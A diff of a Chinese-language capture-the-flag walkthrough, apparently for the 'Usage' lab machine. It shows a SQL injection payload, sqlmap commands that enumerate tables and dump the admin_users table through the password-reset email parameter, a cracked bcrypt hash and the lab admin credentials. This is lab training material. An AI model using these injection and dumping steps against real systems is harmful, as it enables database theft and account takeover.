@@ -69,7 +69,7 @@ SELECT * FROM users WHERE username = 'test' OR 1=1;-- -' AND password = '123';
 #### 拦截的是test@example.com'
 #### 手动修改1.在reset.req去掉末尾的%27
 #### 手动修改2.什么时候改用 Connection: close，服务器在连接复用时表现异常（比如连接复用导致响应错乱、状态混淆或500错误）
-#### Send,响应是空白
+#### 不用Send，send是了看是否500，复制就是了
 ```
 [*]$ vi reset.req
 
@@ -169,11 +169,62 @@ available databases [3]:
 #### 等待的时间大于7分钟
 #### 列出 usage_blog 下的表（保守模式）目的：低并发、慢速列出表，减少 500/503。
 ```
-[★]$ sqlmap -r reset1.req -p email \
-    --batch --level=3 --risk=2 \
-    --threads=1 --delay=2 \
-    --timeout=20 --retries=2 \
-    --drop-set-cookie --flush-session -v 3 \
-    -D usage_blog --tables
+[★]$ sqlmap -r reset1.req -p email --batch --level=3 --risk=2 --threads=10 --drop-set-cookie -D usage_blog --tables
+<SNIP>
+Database: usage_blog
+[15 tables]
++------------------------+
+| aaaaa_iala?us?rs       |
+| admin_user[oeqmiqqia?s |
+| admin_menu             |
+| admin_operation_log    |
+| admin_permissions      |
+| admin_role_menu        |
+| admin_role_permissions |
+| admin_roles            |
+| admin_users            |
+| blog                   |
+| failed_jobs            |
+| migrations             |
+| password_reset_tokens  |
+| personal_access_tokens |
+| users                  |
++------------------------+
+<SNIP>
 ```
-#### 等待的时间大于31分钟，进度过半，不弄了
+#### 这个命令很快
+### [3]再重新再跑一次的步骤 
+#### 1.清理
+#### 2.更新 CSRF token / Cookie 即再burpsuite拦截一次
+```
+[★]$ sqlmap -r reset2.req -p email --batch --level=3 --risk=2  --drop-set-cookie -D usage_blog -T admin_users --dump
+
+[11:36:54] [INFO] retrieved: admin
+Database: usage_blog
+Table: admin_users
+[1 entry]
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+```
+#### 我们获得Administrator用户的哈希值，将其保存到一个名为hash的文件中，并将其提供给哈希破解工具john：
+```
+[★]$ vi hash
+[★]$ cp /usr/share/wordlists/rockyou.txt.gz .
+[★]$ gunzip rockyou.txt.gz
+[★]$ john hash --wordlist=rockyou.txt
+Created directory: /home/syareya55/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+whatever1        (?)     
+1g 0:00:00:09 DONE (2025-09-17 11:47) 0.1103g/s 178.8p/s 178.8c/s 178.8C/s alexis1..serena
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+#### 密码为whatever1 
+### 访问admin.usage.htb,用户/密码：admin/whatever1
